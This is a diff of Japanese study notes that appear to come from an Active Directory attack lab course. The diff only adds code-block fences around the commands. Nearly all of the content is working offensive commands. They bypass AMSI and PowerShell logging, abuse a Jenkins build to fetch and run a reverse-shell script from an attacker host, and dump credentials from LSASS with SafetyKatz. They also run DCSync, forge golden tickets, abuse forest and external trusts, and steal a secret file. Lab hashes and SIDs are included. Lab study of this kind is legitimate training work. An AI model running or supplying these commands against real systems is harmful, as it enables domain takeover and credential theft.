@@ -2,23 +2,23 @@
 
 
 ## SA
-
+```
 ipconfig /all
 tasklist /v
 net user
 netstat -anop tcp
 nslookup <IP>
-
+```
 
 ## AD-Moduleの使用
-
+```
 Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
 
 Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
-
+```
 
 ### User情報
-
+```
 Get-ADUser -Filter * 		# 大量の情報が出るので見やすくするため以下コマンドを使用
 
 Get-ADUser -Filter * | Select-Object SamAccountName, Enabled, SID	# 説明も見たいので以下コマンド
@@ -26,10 +26,10 @@ Get-ADUser -Filter * | Select-Object SamAccountName, Enabled, SID	# 説明も見
 Get-ADUser -Filter * -Properties *	# properties引数が無い時より細部が表示
 
 Get-ADUser -Filter * -Properties * | Select-Object SamAccountName, Enabled, SID, Description
-
+```
 
 ### Domain情報
-
+```
 Get-ADDomain
 
 Get-ADDomain | Format-List PDCEmulator, DomainSID, DNSRoot, NetBIOSName
@@ -37,19 +37,19 @@ Get-ADDomain | Format-List PDCEmulator, DomainSID, DNSRoot, NetBIOSName
 Get-ADDomainController | Select-Object Name, Domain	# ドメインコントローラー情報
 
 Get-ADTrust -Filter * | Select-Object Target, Direction, TrustType	# 信頼の方向
-
+```
 
 ### Forest情報
-
+```
 $forest = Get-ADForest
 
 $forest.Domains
 
 $forest.GlobalCatalogs
-
+```
 
 ### Group情報
-
+```
 Get-ADGroup -Filter * | Select-Object SamAccountName, SID, GroupScope
 
 PS C:\AD\Tools> Get-ADGroupMember -Identity Administrators | Select Name, ObjectClass	# 以下のエラー発生（カレントドメインはAdminがいるドメインではない）
@@ -62,37 +62,41 @@ At line:1 char:1
     + FullyQualifiedErrorId : ActiveDirectoryServer:8235,Microsoft.ActiveDirectory.Management.Commands.GetADGroupMember
 -----------------------------------------------------------
 Get-ADGroupMember -Identity Administrators -Server moneycorp.local | Select Name, ObjectClass	# 認証に失敗してエラーが出る
-
+```
 
 ### Computer情報
-
+```
 Get-ADComputer -Filter * | Select-Object SamAccountName, Enabled, SID
-
+```
 
 ## PowerViewの使用
-
+```
 
 . C:\AD\Tools\PowerView.ps1	# PowerViewを読み込む。PowerViewは攻撃に使われるツールとして有名なのでDefenderで検知・ブロックされる
 
 C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat	# AMSI（アンチ・マルウェア・スキャン・インターフェース）をバイパス
-
+```
 
 ### PowerViewの読込とユーザー情報
-
+```
 . C:\AD\Tools\PowerView.ps1
 
 Get-DomainUser | Select -ExpandProperty SamAccountName	# プロパティの複数取り出し不可
+```
 
 
 ## 書き込み権限の悪用
+```
 
 Import-Module C:\AD\Tools\PowerHuntShares.psm1		# モジュールのインポート
 
 Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt	#ADMINS$,C$,AIが判明。隠しフォルダでないAIを探す
 ・ブラウザでSMBShareを開きInsecure ACEsを見ればAIフォルダがdcorp-ciにあることが分かる
 
+```
 
 ## dcorp-ciの調査
+```
 
 nslookup dcorp-ci
 
@@ -100,6 +104,7 @@ nmap 172.16.3.11 -Pn -sV -T4
 
 nmap 172.16.3.11 -p 8080 -Pn -A -T5	# titleからJenkinsが判明
 ・ブラウザでhttp://172.16.3.11:8080にアクセス
+```
 
 
 ====================================================================
@@ -108,26 +113,32 @@ nmap 172.16.3.11 -p 8080 -Pn -A -T5	# titleからJenkinsが判明
 
 ## PowerUpの使用
 
+```
 C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 
 . C:\AD\Tools\PowerUp.ps1
 
 Invoke-AllChecks
 
+```
 
 ## WinPeasの使用(コマンドプロンプトで実行)
 
+```
 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe	  # -args logで出力したoutput.txtで[Weak Services][AlwaysInstallElevated][Unquoted Paths]を検索するのが手っ取り早い
 
 
+```
 ## PrivEscCheckの使用
 
+```
 C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 
 . C:\AD\Tools\PrivEscCheck.ps1
 
 Invoke-PrivescCheck			# StatusがVulnerable - Highを探す
 
+```
 
 
 ======================================================================
@@ -136,6 +147,7 @@ Invoke-PrivescCheck			# StatusがVulnerable - Highを探す
 
 ## Jenkinsを使用したdcorp-ciへの移動(P39)LO-5
 
+```
 ・JenkinsにアクセスしJoeアカウントを調べる
 ・managerは悪用できそうな部分なし
 ・builduserはプロジェクトがあり変更可能なので悪用可能
@@ -145,9 +157,11 @@ powershell.exe iex (iwr http://172.16.100.48/Invoke-PowerShellTcp.ps1 -UseBasicP
 ・netcatで接続を待ち受け
 ・powershellでdcorp-ciセッションが確立される
 
+```
 
 ## dcorp-ciからのdcorp-mgmtアクセス(P48)LO-7
 
+```
 iex (iwr http://172.16.100.48/sbloggingbypass.txt -UseBasicParsing)	# 拡張ログ（P/S実行内容を記録する監査ログ）をバイパス
 
 iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.48/PowerView.ps1'))	# Defenderで検知ブロックされる(メモリ内実行)
@@ -157,9 +171,11 @@ Find-DomainUserLocation		# どの端末にDAがいるか調べるコマンド。
 
 winrs -r:dcorp-mgmt cmd /c "set computername && set username"	# winrsが有効か＆コマンド実行の可否を調べる
 
+```
 
 ## dcorp-mgmtからクレデンシャル窃取(P49)LO-7
 
+```
 iwr http://172.16.100.48/Loader.exe -OutFile C:\Users\Public\Loader.exe		# Loader.exeをダウンロード。Loader.exeはローダー実行ファイル
 
 echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe	# Loader.exeをターゲット(dcorp-mgmt)に配送
@@ -168,9 +184,11 @@ $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=808
 
 $null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"	# SafetyKatzスクリプトをロードしメモリ上で実行。LSASSからKeroberos復号キー取得
 
+```
 
 ## クレデンシャルを使用しdcorp-dcにアクセス
 
+```
 ・新しいコマンドプロンプトを開始
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ・管理者権限が必要と怒られるので管理者で実行する
@@ -179,6 +197,7 @@ winrs -r:dcorp-dc cmd /c set username USERNAME=svcadmin
 ・何も表示されない場合コマンド実行は成功しているが表示に不具合がある
 ・winrs -r:dcorp-dc cmdで接続できることを確認。見事DCまで侵入できた。
 
+```
 
 ===============================================================================
 # 永続化
@@ -186,6 +205,7 @@ winrs -r:dcorp-dc cmd /c set username USERNAME=svcadmin
 
 ## 秘密の抽出(P62)LO-8
 
+```
 ・管理者としてコマンドプロンプトを起動
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt	# DA権限を持つプロンプトが起動
 
@@ -199,8 +219,10 @@ C:\Users\Public\Loader.exe --obfuscate false -path http://127.0.0.1:8080/SafetyK
 ・秘密情報を入手
 　悪用シナリオ	①他端末の認証に使用（pass the hash） ②NTLMリレー　③パスワードクラック（John）
 
+```
 
 ## ゴールデンチケット攻撃(P63)LO-8
+```
 ・DA権限を持つプロンプトに移動
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"		# DCSync攻撃でkrbtgtのハッシュを取得
 
@@ -214,6 +236,7 @@ set username
 
 set computername
 
+```
 
 
 
@@ -228,6 +251,7 @@ set computername
 
 ## DomainTrustKeyを使用した権限昇格（P97）LO-18
 
+```
 (DA権限を持つプロンプトが起動していれば以下コマンドは省略可能)
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ・新しいプロンプトが開く
@@ -252,9 +276,11 @@ set username
 
 set computername
 
+```
 
 ## krbtgtハッシュ（RC4）を使用した権限昇格（P100）LO-19
 
+```
 (DA権限を持つプロンプトが起動していれば以下コマンドは省略可能.AES256ハッシュはDCSync攻撃で入手)
 
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt
@@ -269,9 +295,11 @@ set computername
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
 ・全ハッシュ入手！
 
+```
 
 ## 外部信頼を悪用(P101)LO-20
 
+```
 ・管理者権限でコマンドプロンプトを起動
 ・(DA権限を持つプロンプトが起動していれば以下コマンドは省略可能)
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
@@ -291,3 +319,4 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/e
 dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\	# 外部信頼ドメインの共有リソースにアクセス
 
 type \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt	# secret.txtの情報窃取
+```
